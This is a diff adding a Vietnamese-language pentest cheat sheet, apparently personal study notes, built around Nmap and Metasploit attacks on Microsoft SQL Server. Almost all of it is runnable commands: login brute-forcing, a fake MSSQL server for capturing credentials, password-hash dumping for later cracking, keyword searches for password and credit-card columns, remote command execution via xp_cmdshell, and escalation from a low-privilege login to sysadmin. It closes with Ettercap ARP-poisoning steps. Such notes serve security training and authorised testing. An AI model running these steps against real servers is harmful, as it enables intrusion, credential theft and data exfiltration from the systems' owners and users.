@@ -1,0 +1,150 @@
+---------------------------Nmap---------------------------
+- nmap -h: xem các tham số cơ bản của nmap
+- nmap -sn ip(ip quét): quét tất cả các máy trong nhánh mạng ip đó ví dụ: nmap -sn 10.0.2.0/24.
+- nmap -A ip: quét tất cả thông tin của máy có ip này.
+- nmap --script "exploit" -p- địa chỉ or ip máy quét: quét tất cả các port.
+ + --script "exploit": chỉ định sử dụng các script trong nhóm exploit.
+ + -p-: quét tất cả các cổng từ 1 đến 65535.
+- nmap -O IP or hostname máy mục tiêu: xác định hệ điều hành.
+- nmap -p- ip : quét các port đang mở.
+- nmap -sV ip: xác định dịch vụ các port.
+- nmap -O -p- -sV ip: thực hiện các thao tác trên cùng lúc.
+---------------------------MSSLQ------------------------------
+
+(Tăng tốc quét thì thêm -T0 đến -T5)
+
+- Quét tìm sql server:
+ + nmap -p 1433 -sV <địa chỉ ip>: quét tìm qua giao thức tcp cổng 1433 (địa chỉ ở đây là địa chỉ máy tính).
+ + nmap -p U:1434 -sU -sV <địa chỉ IP>: tìm qua giao thức phản hồi UDP 1434.
+ + nmap -p U:1434 -sU -sV <địa chỉ ip đầu>-<địa chỉ ip cuối>: tìm trên một dải ip.
+---------------------------------------------------------------
+--------------------------metaploit---------------------------
+- msfconsole: vào màn hình console của metaploit (luôn phải vào để sử dụng meta)
+- search tên dịch vụ hay lỗ hổng(từ khóa): để tìm công cụ hay modul để khai thác lỗ hổng. 
+- use tên công cụ : sử dụng công cụ.
+- options: xem các thông số cần thiết.
+- run or exploit: để chạy sau khi set xong giá trị.
+
+------------------------------meta of mssql--------------------------------------------
+- Quét thông tin sql server: 
+ + use auxiliary/scanner/mssql/mssql_ping: sử dụng modun này để quét.
+ + set RHOSTS [ip_address]: set địa chỉ máy chủ sql server đẻ quét. (VD: 192.168.1.1/24)
+ + run/expoit: chạy modun.
+
+- Cracking password:
+ + use auxiliary/scanner/mssql/mssql_login
+ + set RHOSTS [ip_address]: ip sql server.
+ + set USERNAME [username] or USER_FILE [path_file]: lấy một username r tìm mật khẩu.
+ + set PASS_FILE [path_to_password]: đường dẫn file password.
+ + run/exploit.
+OR:
+ + use auxiliary/scanner/mssql/mssql_login
+ + set rhosts [ip_address].
+ + set user_file /root/users.txt: lấy username từ file có đường dẫn /root/users.txt.
+ + set verbose false: tắt chế độ ghi log chi tiết.
+ + exploit
+
+- Truy xuất phiên bản sql Server:
+ + use auxiliary/admin/mssql/mssql_sql.
+ + set RHOSTS [ip_address].
+ + set username [username].
+ + set password [password].
+ + exploit/run.
+ + select @@VERSION: truy xuất phiên bản của sql server.
+OR + set SQL SELECT name FROM master.sys.databases: xem tất cả các database trong sql.
+ + set SQL [your_sql_query]: xem chi tiết thông tin của một database:
+   * SELECT 
+    	db.name AS [Database Name],
+    	mf.name AS [Logical Name],
+    	mf.type_desc AS [File Type],
+    	mf.physical_name AS [Path],
+    	CAST((mf.Size * 8) / 1024.0 AS DECIMAL (18, 1)) AS [Initial Size (MB)]
+     FROM 
+    	sys.master_files AS mf
+     INNER JOIN 
+    	sys.databases AS db ON db.database_id = mf.database_id
+      WHERE
+    	db.name = 'my_database':tên database muốn xem .
+- Kiểm tra cấu hình bảo mất sql server:
+ + use auxiliary/admin/mssql/mssql_enum
+ + set RHOSTS [ip_address].
+ + set username [username].
+ + set password [password].
+ + exploit
+OR:
+ + show tagets: hiển thị các mục tiêu
+ + set target taget_id
+ + show options: hiển thị và đặt các tùy chọn.
+ + exploit.
+(nhớ kiểm tra hai dòng: xp_cmdshell và remote access
+
+-Liệt kê danh sách người dùng:
+ + use auxiliary/admin/mssql/mssql_enum_sql_login
+ + set RHOSTS [ip_address].
+ + set username [username].
+ + set password [password].
+ + exploit
+
+- Chụp thông tin đăng nhập:
+ + use auxiliary/server/capture/mssql: cung cấo dịch vụ mssql giả.
+ + set srvhost [192.168.1.2]: đặt đại chỉ ip máy chủ giả (có thể đặt ip bất kỳ và cũng như lấy ip máy kali).
+ + sqsh -S 192.168.1.2 -U sa -P "password@1": Câu lệnh bạn đã cung cấp sẽ kết nối đến SQL Server tại địa chỉ IP 192.168.1.2 thông qua công cụ sqsh với tên người dùng là sa và mật khẩu là password@1.
+  * sqsh là một công cụ dòng lệnh cho Linux cho phép bạn kết nối và thao tác với SQL Server.
+
+- Tìm tất cả các thông tin các cơ sở dữ liệu không mặc định trên sql server khớp với từ khóa trong tùy chọn keywords:
+ + use auxiliary/admin/mssql/mssql_findandsampledata
+ + set rhosts 192.168.1.3
+ + set username lowpriv
+ + set password Password@1
+ + set sample_size 4: chọn 4 bản ghi từ mỗi bảng bị ảnh hưởng hay thỏa mãn keywords.
+ + set keywords FirstName|passw|credit: tìm tất cả các cột khớp với từ khóa sau keywords.
+ + exploit
+
+- Lấy thông tin tên bảng, tên cột, kiểu dữ liệu của cột tất cả các database không mặc định trong sql server:
+ + use auxiliary/scanner/mssql/mssql_schemadump
+ + set rhosts 192.168.1.3
+ + set username lowpriv
+ + set password Password@1
+ + exploit
+
+- Trích xuất tên người dùng và băm mật khẩu được mã hóa từ một máy chủ mssql và lưu trữ chúng để sau này có thể crack:
+ + use auxiliary/scanner/mssql/mssql_hashdump
+ + set rhosts 192.168.1.149
+ + set username sa
+ + set password Password@1
+ + expoit
+
+~~~~~~~~~~~~~~Command Exceution~~~~~~~~~~~~~~~~
+- xp_cmdshell: thực thi payload tùy ý trên sql server, sử dụng lỗ hổng sql injection, 
+ + use exploit/windows/mssql/mssql_payload
+ + set rhosts 192.168.1.3
+ + set username lowpriv
+ + set password Password@1
+ + exploit
+
+- MSSQL_EXEC: Bây giờ, nếu chúng ta muốn thực thi một lệnh trên máy chủ, chúng ta có thể thực hiện điều đó từ xa với sự trợ giúp của khai thác sau của Metasploit:
+	+ use auxiliary/admin/mssql/mssql_exec
+	+ set rhosts 192.168.1.3
+	+ set username lowpriv
+	+ set password Password@1
+	+ set cmd "net user"
+	+ exploit
+Lệnh net user là một công cụ dòng lệnh trong Windows, cho phép bạn quản lý tài khoản người dùng trên hệ thống. Bạn có thể tạo, xóa, kích hoạt hoặc vô hiệu hóa người dùng trên hệ thống và đặt mật khẩu cho tài khoản người dùng mạng1. Lệnh này hoạt động với tất cả các phiên bản của Windows, bao gồm Windows 11, Windows 10 và tất cả các phiên bản Windows cũ hơn.
+ 
+- Tăng quyền lên systemadmin:
+use auxiliary/admin/mssql/mssql_escalate_dbowner
+set rhosts 192.168.1.3
+set username lowpriv
+set password Password@1
+exploit
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+---------------------------------------------------------------------------------------
+
+
+-----------Ettercap-------------------
+- Chon card mang.
+- Hosts -> quet hosts.
+- Chon ip may tan cong -> add tagets 1.
+- chon hinh thuc tan cong - >  arp poisoning -> sniff remote connections ->
+--------------------------------------
